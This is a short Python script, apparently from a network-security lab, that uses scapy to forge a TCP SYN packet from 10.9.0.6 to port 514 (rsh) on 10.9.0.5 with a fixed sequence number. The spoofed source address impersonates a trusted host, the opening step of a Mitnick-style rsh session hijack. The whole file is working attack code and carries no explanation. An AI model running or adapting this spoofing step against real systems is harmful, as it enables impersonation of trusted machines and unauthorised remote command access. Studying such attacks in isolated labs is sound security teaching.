from scapy.all import *

def SYN_Spoof_Atk():
	print("Sending Spoofed SYN Packet ...")
	IPLayer = IP(src="10.9.0.6", dst="10.9.0.5")
	TCPLayer = TCP(sport=1023,dport=514,flags="S", seq=778933536)
	pkt = IPLayer/TCPLayer
	send(pkt,verbose=0)

def main():
	SYN_Spoof_Atk()

if __name__ == "__main__":
	main()
